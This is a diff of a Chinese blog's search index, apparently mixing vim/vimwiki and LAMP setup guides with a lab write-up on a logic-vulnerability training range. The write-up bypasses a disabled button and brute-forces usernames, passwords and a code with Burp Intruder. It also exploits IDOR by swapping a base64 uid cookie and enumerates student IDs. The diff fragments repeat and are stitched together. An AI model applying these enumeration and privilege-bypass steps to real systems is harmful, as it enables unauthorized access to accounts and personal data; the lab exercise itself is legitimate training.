+<h2 id="越权漏洞"><a href="#越权漏洞" class="headerlink" title="越权漏洞"></a>越权漏洞</h2><p>burpsuite开启代理，使用user1账号登录，发现第一个数据包cookie中有<code>uid=dXNlcjE%3D</code>字段</p>
+<p><img data-src="https://images.gaifagafin.top/202312022049561.png"></p>
+<p>将<code>dXNlcjE%3D</code>使用url解码，再使用base64解码，得到<code>uid=user1</code>，可知uid和账户名有编码对应关系</p>
+<p><img data-src="https://images.gaifagafin.top/202312022049076.png"></p>
+<p>欲获取admin与admin1的个人信息，先将用户名base64编码</p>
+<p><img data-src="https://images.gaifagafin.top/202312022049613.png"></p>
+<p>将第二个数据包中的uid值更换成admin的base64编码，发送数据包，成功获取admin个人信息</p>
+<p><img data-src="https://images.gaifagafin.top/202312022049468.png"></p>
+<p>将第二个数据包中的uid值更换成admin1的base64编码，发送数据包，成功获取admin1个人信息</p>
+<p><img data-src="https://images.gaifagafin.top/202312022049859.png"></p>
+<h2 id="遍历漏洞"><a href="#遍历漏洞" class="headerlink" title="遍历漏洞"></a>遍历漏洞</h2><p>已知当前系统中存在的一个学号为：20190504035XA01，开启burpsuite代理，使用此学号查询</p>
+<p><img data-src="https://images.gaifagafin.top/202312022049755.png"></p>
+<p>根据此学号的格式，推理学号前八位20190504是入学年月日（不变），那么只需要遍历XA之前的三位数字和最后两位数字即可</p>
+<p>将数据包传给intruder模块，使用集束炸弹模式，设置有效载荷</p>
+<p><img data-src="https://images.gaifagafin.top/202312022050820.png"></p>
+<p>将有效载荷选项设置成<strong>暴力</strong>，如下图</p>
+<p><img data-src="https://images.gaifagafin.top/202312022049883.png"></p>
+<p>点击开始攻击，等待一段时间，得到爆破结果</p>
+<p><img data-src="https://images.gaifagafin.top/202312022050568.png"></p>
+<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#整合出的编号</span></span><br><span class="line"><span class="number">20190504035</span>XA01</span><br><span class="line"><span class="number">20190504035</span>XA02</span><br><span class="line"><span class="number">20190504036</span>XA03</span><br><span class="line"><span class="number">20190504036</span>XA04</span><br><span class="line"><span class="number">20190504037</span>XA05</span><br><span class="line"><span class="number">20190504037</span>XA06</span><br><span class="line"><span class="number">20190504038</span>XA07</span><br><span class="line"><span class="number">20190504038</span>XA08</span><br></pre></td></tr></table></figure>
 
-<p>将这三个配置修改成如下图</p>
-<img data-src="https://images.gaifagafin.top/202311241242022.png" style="zoom:80%;" />
-
-<h2 id="下载vimwiki"><a href="#下载vimwiki" class="headerlink" title="下载vimwiki"></a>下载vimwiki</h2><p>在终端输入：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">下载vimwiki</span></span><br><span class="line">git clone https://github.com/vimwiki/vimwiki.git ~/.vim/pack/plugins/start/vimwiki</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">to generate documentation i.e. <span class="string">&#x27;:h vimwiki&#x27;</span></span></span><br><span class="line">vim -c &#x27;helptags ~/.vim/pack/plugins/start/vimwiki/doc&#x27; -c quit</span><br></pre></td></tr></table></figure>
-
-<p>后面的指令用来生成vimwiki的帮助文档</p>
-<h2 id="使用vimwiki"><a href="#使用vimwiki" class="headerlink" title="使用vimwiki"></a>使用vimwiki</h2><p>下载完成之后打开<code>vim</code>，在命令模式下输入<code>&lt;Leader&gt;ww</code>，此处<code>&lt;Leader&gt;</code>默认是<code>\</code>，即输入<code>\ww</code>进入即可进行vimwiki编写</p>
-<img data-src="https://images.gaifagafin.top/202311241242078.png" style="zoom: 80%;" />
-
-<h1 id="vim插件下载"><a href="#vim插件下载" class="headerlink" title="vim插件下载"></a>vim插件下载</h1><p>vimwiki是默认支持markDown格式的，但若想更方便的编辑，需下载插件。</p>
-<p><code>Vim-plug</code> 是一个Vim插件管理器，利用异步并行可以快速地安装、更新和卸载插件。</p>
-<h2 id="Vim-plug的安装"><a href="#Vim-plug的安装" class="headerlink" title="Vim-plug的安装"></a><a href="https://github.com/junegunn/vim-plug">Vim-plug</a>的安装</h2><p>输入指令(在线安装)</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -fLo ~/.vim/autoload/plug.vim --create-dirs     https://raw.githubusercontent.com/junegunn/vim-plug/master/plug.vim</span><br></pre></td></tr></table></figure>
-
-<img data-src="https://images.gaifagafin.top/202311241242157.png" style="zoom:80%;" />
-
-<h2 id="插件的添加和删除"><a href="#插件的添加和删除" class="headerlink" title="插件的添加和删除"></a>插件的添加和删除</h2><p>要安装插件，你必须如下所示首先在 Vim 配置文件中声明它们。</p>
-<p>一般 Vim 的配置文件是 <code>~/.vimrc</code>(我的配置文件在 &#x2F;etc&#x2F;vim&#x2F;vimrc)，Neovim 的配置文件是 <code>~/.config/nvim/init.vim</code>。</p>
-<p>请记住，当你在配置文件中声明插件时，列表应该以 <code>call plug#begin(PLUGIN_DIRECTORY)</code> 开始，并以 <code>plug#end() </code>结束。</p>
-<p>编辑 <code>vimrc </code>文件中的内容，比如安装“lightline.vim” 插件</p>
-<figure class="highlight leaf"><table><tr><td class="code"><pre><span class="line">call plug<span class="punctuation">#</span><span class="keyword">begin</span><span class="params">(&#x27;~<span class="operator">/</span>.<span class="variable">vim</span><span class="operator">/</span><span class="variable">plugged</span>&#x27;)</span></span><br><span class="line">Plug &#x27;itchyny/lightline.vim&#x27;</span><br><span class="line">call plug<span class="punctuation">#</span><span class="keyword">end</span><span class="params">()</span></span><br></pre></td></tr></table></figure>
-
-<p>下图是我为编写markDown安装的插件：</p>
-<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">call</span> plug#begin(<span class="string">&#x27;~/.vim/plugged&#x27;</span>)</span><br><span class="line">Plug <span class="string">&#x27;godlygeek/tabular&#x27;</span></span><br><span class="line">Plug <span class="string">&#x27;plasticboy/vim-markdown&#x27;</span></span><br><span class="line">Plug <span class="string">&#x27;mzlogin/vim-markdown-toc&#x27;</span></span><br><span class="line">Plug <span class="string">&#x27;iamcco/markdown-preview.nvim&#x27;</span></span><br><span class="line"><span class="keyword">call</span> plug#end()</span><br></pre></td></tr></table></figure>
-
-<img data-src="https://images.gaifagafin.top/202311241242914.png" style="zoom:80%;" />
-
-<p><code>:w</code>保存之后在vim命令模式下输入：</p>
-<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">:PlugInstall</span><br></pre></td></tr></table></figure>
-
-<img data-src="https://images.gaifagafin.top/202311241243535.png" style="zoom:80%;" />
-
-<h2 id="报错解决"><a href="#报错解决" class="headerlink" title="报错解决"></a>报错解决</h2><p>在vim输入<code>:PlugInstall</code>后，我这里报了一个错误</p>
-<p><img data-src="https://images.gaifagafin.top/202311241243438.png"></p>
-<p>可以尝试以下解决方法：</p>
-<p>1、打开hosts</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/hosts</span><br></pre></td></tr></table></figure>
-
-<p>2、在hosts里面添加下列内容</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">199.232.28.133 raw.githubusercontent.com</span><br></pre></td></tr></table></figure>
-
-<h2 id="安装完成"><a href="#安装完成" class="headerlink" title="安装完成"></a>安装完成</h2><img data-src="https://images.gaifagafin.top/202311241243943.png" style="zoom:80%;" />
-
-<h1 id="使用vimwiki编写markDown"><a href="#使用vimwiki编写markDown" class="headerlink" title="使用vimwiki编写markDown"></a>使用vimwiki编写markDown</h1><h2 id="使用markDown-Preview在网页预览markDown"><a href="#使用markDown-Preview在网页预览markDown" class="headerlink" title="使用markDown-Preview在网页预览markDown"></a>使用markDown-Preview在网页预览markDown</h2><p>vim打开<code>.md</code>后缀的文件，命令行输入<code>:MarkdownPreview</code>，就会在打开的浏览器中看到markDown的预览页面</p>
-<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="comment">&quot; 开启Mardown预览</span></span><br><span class="line">:MarkdownPreview</span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; 关闭Mardown预览</span></span><br><span class="line">:MarkdownPreviewStop</span><br></pre></td></tr></table></figure>
-
-<img data-src="https://images.gaifagafin.top/202311241243566.png" style="zoom:80%;" />
-
-<p>注意：在<code>.wiki</code>文件中使用命令启动markDown-Preview插件会报错</p>
-<img data-src="https://images.gaifagafin.top/202311241243906.png" style="zoom:80%;" />
-
-<p>只需要将文件后缀<code>.wiki</code>改成<code>.md</code>即可</p>
-<img data-src="https://images.gaifagafin.top/202311241243194.png" style="zoom:80%;" />
-
-<hr>
-<p>参考链接：</p>
-<p> <a href="https://www.cnblogs.com/zhaodehua/articles/15108744.html">https://www.cnblogs.com/zhaodehua/articles/15108744.html</a></p>
-<p><a href="https://zhuanlan.zhihu.com/p/84773275">高效做笔记:vim + markdown - 知乎 (zhihu.com)</a></p>
-<p><a href="https://www.cnblogs.com/yutian-blogs/p/12904221.html">Linux下安装vim-plug报错：Failed to connect to raw.githubusercontent.com port 443: Connection refused - Yu_tiann - 博客园 (cnblogs.com)</a></p>
-<p><a href="https://blog.csdn.net/lxyoucan/article/details/114362756">https://blog.csdn.net/lxyoucan/article/details/114362756</a></p>
+<p>查询结果</p>
+<p><img data-src="https://images.gaifagafin.top/202312022050882.png"></p>
+<h2 id="暴力破解攻击"><a href="#暴力破解攻击" class="headerlink" title="暴力破解攻击"></a>暴力破解攻击</h2><p>如之前突破功能限制，开启burpsuite代理，按F12将<code>disable=&quot;disable&quot;</code>删除，输入6位数编号查询，抓取数据包</p>
+<p><img data-src="https://images.gaifagafin.top/202312022050498.png"></p>
+<p>将数据包发送到intruder模块，设置如下图</p>
+<p><img data-src="https://images.gaifagafin.top/202312022050745.png"></p>
+<p>将有效载荷类型改成<strong>暴力</strong>，配置如下图，点击开始攻击</p>
+<p><img data-src="https://images.gaifagafin.top/202312022050543.png"></p>
+<p>等待一段时间后，得到爆破结果<code>735142</code></p>
+<p><img data-src="https://images.gaifagafin.top/202312042101819.png"></p>
+<p>查询编号得到弹框FLAG内容<code>flag&#123;d1ct_1s_v3ry_1mp0rt4nt&#125;</code></p>
+<p><img data-src="https://images.gaifagafin.top/202312022050496.png"></p>
 ]]></content>
       <categories>
-        <category>Linux</category>
-        <category>Vim</category>
+        <category>漏洞</category>
       </categories>
       <tags>
-        <tag>vimwiki</tag>
-        <tag>vim-markDown</tag>
+        <tag>漏洞</tag>
       </tags>
   </entry>
   <entry>
@@ -5081,132 +5207,6 @@ height: 100%; left: 0; top: 0;"> </iframe></div>
       </categories>
       <tags>
         <tag>笔记</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>记一次搭建LAMP web环境</title>
-    <url>/2023/11/04/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%90%AD%E5%BB%BALAMP%20web%E7%8E%AF%E5%A2%83/</url>
-    <content><![CDATA[<h1 id="搭建LAMP-web环境"><a href="#搭建LAMP-web环境" class="headerlink" title="搭建LAMP web环境"></a>搭建LAMP web环境</h1><h2 id="在虚拟机搭建web环境"><a href="#在虚拟机搭建web环境" class="headerlink" title="在虚拟机搭建web环境"></a>在虚拟机搭建web环境</h2><p>我的虚拟机系统是kali linux,里面已经有了Apache2和MySQL和PHP的环境</p>
-<p>终端输入<code>php -v</code>查看PHP版本</p>
-<p><img data-src="https://images.gaifagafin.top/202311051105539.png"></p>
-<p>终端输入<code>service Apache2 start</code> 启动Apache服务</p>
-<p>终端输入<code>service MySQL start</code> 启动MySQL服务</p>
-<p><img data-src="https://images.gaifagafin.top/202311051105283.png"></p>
-<p><img data-src="https://images.gaifagafin.top/202311051105413.png"></p>
-<p>然后终端分别输入<code>service Apache2 status</code>和<code>service MySQL status</code>查看服务状态</p>
-<p><img data-src="https://images.gaifagafin.top/202311051105653.png"></p>
-<p><img data-src="https://images.gaifagafin.top/202311051105983.png"></p>
-<p>服务正常启动</p>
-<p>接下来在网站测试服务是否可用</p>
-<p>linux浏览器输入localhost，若回显页面</p>
-<p><img data-src="https://images.gaifagafin.top/202311051105582.png"></p>
-<p>说明Apache服务正常</p>
-<p>接下来测试PHP服务，终端输入<code>cd /var/www/html</code></p>
-<p><img data-src="https://images.gaifagafin.top/202311051105350.png"></p>
-<p>在此目录下创建一个index.php文件，内容是phpinfo，输入<code>echo &#39;&lt;?php phpinfo(); ?&gt;&#39; &gt; index.php</code>(要在root权限下)</p>
-<p><img data-src="https://images.gaifagafin.top/202311051106523.png"></p>
-<p>接下来在浏览器输入<code>localhost/index.php</code>,成功看到回显，说明PHP服务正常</p>
-<p><img data-src="https://images.gaifagafin.top/202311051106180.png"></p>
-<p>以上做完说明web环境被成功搭建</p>
-<h2 id="在docker里搭建LAMP"><a href="#在docker里搭建LAMP" class="headerlink" title="在docker里搭建LAMP"></a>在docker里搭建LAMP</h2><p>在docker搭建lamp web环境，我这里选择拉取网上已经集成了MySQL服务和Apache服务的镜像(root权限下运行)</p>
-<p><img data-src="https://images.gaifagafin.top/202311051106639.png"></p>
-<p>这里我选择linode&#x2F;lamp,输入<code>docker pull linode/lamp</code></p>
-<p><img data-src="https://images.gaifagafin.top/202311051106325.png"></p>
-<p>输入<code>docker images</code>查看下载的镜像</p>
-<p><img data-src="https://images.gaifagafin.top/202311051106503.png"></p>
-<p>输入<code>docker run -tid -p 8080:80 -p 3309:3306 -v /var/www/html:/var/www/html --name lamp linode/lamp /bin/bash</code>创建容器(-p 参数是指定端口映射 ，-v参数是指定目录映射，–name 为此容器创建名字)</p>
-<p>创建成功后查看正在运行的容器<code>docker ps</code></p>
-<p><img data-src="https://images.gaifagafin.top/202311051106900.png"></p>
-<p>输入<code>docker exec -it 16b /bin/bash</code>进入容器(16b为容器id前3位)</p>
-<p><img data-src="https://images.gaifagafin.top/202311051106366.png"></p>
-<p>和之前一样开启Apache和MySQL服务</p>
-<p><img data-src="https://images.gaifagafin.top/202311051106049.png"></p>
-<p>在浏览器访问<code>localhost:8080</code>,如果出现无法访问的情况，则需要重启docker服务(exit退出容器)，退出容器后终端输入<code>systemctl restart docker</code></p>
-<p><img data-src="https://images.gaifagafin.top/202311051106627.png"></p>
-<p>再<code>docker start 容器id</code>，重复开启Apache和MySQL服务过程，在浏览器访问<code>localhost:8080</code>页面回显证明容器中的Apache服务成功运行</p>
-<p><img data-src="https://images.gaifagafin.top/202311051106455.png"></p>
-<p>接下来测试容器中PHP服务，容器中输入<code>cd var/www/example.com/public_html</code></p>
-<p><img data-src="https://images.gaifagafin.top/202311051106861.png"></p>
-<p>输入<code>&quot;&lt;?php phpinfo(); ?&gt;&quot; &gt; 1.php</code>将测试php文件写入当前目录下</p>
-<p><img data-src="https://images.gaifagafin.top/202311051107831.png"></p>
-<p>浏览器输入<code>http://localhost:8080/1.php</code>访问测试php文件，看到回显，说明PHP服务也正常</p>
-<p><img data-src="https://images.gaifagafin.top/202311051107278.png"></p>
-<p>以上做完则成功在docker中搭建了lamp web环境</p>
-]]></content>
-      <categories>
-        <category>杂项</category>
-      </categories>
-      <tags>
-        <tag>Web</tag>
-        <tag>LAMP</tag>
-        <tag>环境</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>逻辑漏洞靶场环境——logic</title>
-    <url>/2023/12/02/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E7%8E%AF%E5%A2%83%E2%80%94%E2%80%94logic/</url>
-    <content><![CDATA[<h1 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h1><p>漏洞环境：逻辑漏洞靶场环境——logic<br>要求提交实验报告<br>1.突破功能限制漏洞。要求突破查询按钮disable限制，获取编号：110010的查询内容（弹框中的flag）。<br>2.用户信息泄漏漏洞。通过回显信息，以暴力破解方式猜测系统中存在的两个用户名(提示：用户名以 “u” 开头)，并暴力破解这两个用户对应的密码。<br>3.越权漏洞。通过上一步破解的用户名密码登录，利用越权漏洞获取admin与admin1的个人信息。<br>4.遍历漏洞。已知当前系统中存在的一个学号为：20190504035XA01。利用遍历漏洞获取其他学号对应的成绩（不少于5条）。<br>5.暴力破解攻击。获取系统中另一个六位数字编号对应的弹框flag内容。</p>
-<h1 id="靶场搭建"><a href="#靶场搭建" class="headerlink" title="靶场搭建"></a>靶场搭建</h1><p>进入靶场文件目录下输入<code>docker-compose up -d</code>启动靶场，访问<code>http://192.168.37.128:8993</code>即可</p>
-<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><h2 id="突破功能限制漏洞"><a href="#突破功能限制漏洞" class="headerlink" title="突破功能限制漏洞"></a>突破功能限制漏洞</h2><p>查询按钮是灰色的，无法被点击</p>
-<p><img data-src="https://images.gaifagafin.top/202312022048006.png"></p>
-<p>按F12进入查看器，定位到按钮的前端功能实现，将<code>disable=&quot;disable&quot;</code>删除后点击查询</p>
-<p><img data-src="https://images.gaifagafin.top/202312022048806.png"></p>
-<p>弹窗获得FLAG：<code>flag&#123;byp4ss1s_ez&#125;</code></p>
-<p><img data-src="https://images.gaifagafin.top/202312022049066.png"></p>
-<h2 id="用户信息泄漏漏洞"><a href="#用户信息泄漏漏洞" class="headerlink" title="用户信息泄漏漏洞"></a>用户信息泄漏漏洞</h2><p>随便输入用户名和密码，提示用户名不正确</p>
-<p><img data-src="https://images.gaifagafin.top/202312022049396.png"></p>
-<p>burpsuite开启代理</p>
-<p><img data-src="https://images.gaifagafin.top/202312022049002.png"></p>
-<p>将请求包发送给intruder，对用户名进行爆破，得到用户名如下</p>
-<p><img data-src="https://images.gaifagafin.top/202312022049622.png"></p>
-<figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#爆破出的用户名</span></span><br><span class="line"><span class="keyword">user</span></span><br><span class="line"><span class="title">user1</span></span><br><span class="line">admin</span><br><span class="line">admin1</span><br></pre></td></tr></table></figure>
-
-<p>将爆出的用户名装载进有效负载集，爆破密码</p>
-<p><img data-src="https://images.gaifagafin.top/202312022049648.png"></p>
-<figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#爆破出的用户名及密码</span></span><br><span class="line"><span class="keyword">user</span>	<span class="title">888888</span></span><br><span class="line">user1	<span class="number">123456</span></span><br></pre></td></tr></table></figure>
-
-<p>使用爆破出的用户名及密码成功登录</p>
-<p><img data-src="https://images.gaifagafin.top/202312022049308.png"></p>
-<p><img data-src="https://images.gaifagafin.top/202312022049817.png"></p>
-<h2 id="越权漏洞"><a href="#越权漏洞" class="headerlink" title="越权漏洞"></a>越权漏洞</h2><p>burpsuite开启代理，使用user1账号登录，发现第一个数据包cookie中有<code>uid=dXNlcjE%3D</code>字段</p>
-<p><img data-src="https://images.gaifagafin.top/202312022049561.png"></p>
-<p>将<code>dXNlcjE%3D</code>使用url解码，再使用base64解码，得到<code>uid=user1</code>，可知uid和账户名有编码对应关系</p>
-<p><img data-src="https://images.gaifagafin.top/202312022049076.png"></p>
-<p>欲获取admin与admin1的个人信息，先将用户名base64编码</p>
-<p><img data-src="https://images.gaifagafin.top/202312022049613.png"></p>
-<p>将第二个数据包中的uid值更换成admin的base64编码，发送数据包，成功获取admin个人信息</p>
-<p><img data-src="https://images.gaifagafin.top/202312022049468.png"></p>
-<p>将第二个数据包中的uid值更换成admin1的base64编码，发送数据包，成功获取admin1个人信息</p>
-<p><img data-src="https://images.gaifagafin.top/202312022049859.png"></p>
-<h2 id="遍历漏洞"><a href="#遍历漏洞" class="headerlink" title="遍历漏洞"></a>遍历漏洞</h2><p>已知当前系统中存在的一个学号为：20190504035XA01，开启burpsuite代理，使用此学号查询</p>
-<p><img data-src="https://images.gaifagafin.top/202312022049755.png"></p>
-<p>根据此学号的格式，推理学号前八位20190504是入学年月日（不变），那么只需要遍历XA之前的三位数字和最后两位数字即可</p>
-<p>将数据包传给intruder模块，使用集束炸弹模式，设置有效载荷</p>
-<p><img data-src="https://images.gaifagafin.top/202312022050820.png"></p>
-<p>将有效载荷选项设置成<strong>暴力</strong>，如下图</p>
-<p><img data-src="https://images.gaifagafin.top/202312022049883.png"></p>
-<p>点击开始攻击，等待一段时间，得到爆破结果</p>
-<p><img data-src="https://images.gaifagafin.top/202312022050568.png"></p>
-<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#整合出的编号</span></span><br><span class="line"><span class="number">20190504035</span>XA01</span><br><span class="line"><span class="number">20190504035</span>XA02</span><br><span class="line"><span class="number">20190504036</span>XA03</span><br><span class="line"><span class="number">20190504036</span>XA04</span><br><span class="line"><span class="number">20190504037</span>XA05</span><br><span class="line"><span class="number">20190504037</span>XA06</span><br><span class="line"><span class="number">20190504038</span>XA07</span><br><span class="line"><span class="number">20190504038</span>XA08</span><br></pre></td></tr></table></figure>
-
-<p>查询结果</p>
-<p><img data-src="https://images.gaifagafin.top/202312022050882.png"></p>
-<h2 id="暴力破解攻击"><a href="#暴力破解攻击" class="headerlink" title="暴力破解攻击"></a>暴力破解攻击</h2><p>如之前突破功能限制，开启burpsuite代理，按F12将<code>disable=&quot;disable&quot;</code>删除，输入6位数编号查询，抓取数据包</p>
-<p><img data-src="https://images.gaifagafin.top/202312022050498.png"></p>
-<p>将数据包发送到intruder模块，设置如下图</p>
-<p><img data-src="https://images.gaifagafin.top/202312022050745.png"></p>
-<p>将有效载荷类型改成<strong>暴力</strong>，配置如下图，点击开始攻击</p>
-<p><img data-src="https://images.gaifagafin.top/202312022050543.png"></p>
-<p>等待一段时间后，得到爆破结果<code>735142</code></p>
-<p><img data-src="https://images.gaifagafin.top/202312042101819.png"></p>
-<p>查询编号得到弹框FLAG内容<code>flag&#123;d1ct_1s_v3ry_1mp0rt4nt&#125;</code></p>
-<p><img data-src="https://images.gaifagafin.top/202312022050496.png"></p>
-]]></content>
-      <categories>
-        <category>漏洞</category>
-      </categories>
-      <tags>
-        <tag>漏洞</tag>
       </tags>
   </entry>
 </search>
